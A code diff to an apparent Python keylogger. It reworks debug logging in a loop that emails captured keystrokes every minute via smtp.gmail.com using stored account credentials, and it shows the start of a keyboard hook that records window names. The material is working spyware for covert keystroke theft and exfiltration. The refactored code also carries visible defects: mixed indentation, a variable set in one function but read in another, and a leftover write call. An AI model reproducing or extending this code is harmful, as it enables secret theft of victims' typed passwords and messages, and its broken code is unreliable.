@@ -36,13 +36,8 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-        file_object = open(debugFile, "a+")
-        file_object.write("===== SENDING EMAIL: DEBUG MODE =====\n")
-        file_object.write("Data Content Length: " + str(len(data)) + "\n")
-        file_object.write("Keylogger Content: " + data + "\n")
-        file_object.write("Email: " + EEMAIL + "\n")
-        file_object.write("Password: " + EPASS + "\n")
-        file_object.write("[*] SENDING EMAIL NOW" + "\n")
+        DEBUG_MODE = DEBUG_INPUT
+        write_to_debug_file("===== SENDING EMAIL: DEBUG MODE =====\n" + "Data Content Length: " + str(len(data)) + "\n" + "Keylogger Content: " + data + "\n" + "Email: " + EEMAIL + "\n" + "Password: " + EPASS + "\n" + "[*] SENDING EMAIL NOW" + "\n")
         if len(data) > 0:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
@@ -71,13 +66,19 @@ def send_mail():
                 file_object.write("[*] Data Sent!" + "\n")
             except Exception as error:
                 print error
-                file_object.write("[*] Error Encountered: " + error + "\n")
+                write_to_debug_file("[*] Error Encountered: " + error + "\n")
         else:
-		    file_object.write("[*] Error Encountered: No content found, email will not be sent\n")
-        file_object.close()
+		    write_to_debug_file("[*] Error Encountered: No content found, email will not be sent\n")
         sleep(60)
 
 
+def write_to_debug_file(string_to_write):
+    if(DEBUG_MODE == 'y'):
+	    file_object = open(debugFile, "a+")
+		file_object.write(string_to_write)
+		file_object.close()
+	
+		
 def pushing(event):
     global data, lastWindow
     window = event.WindowName
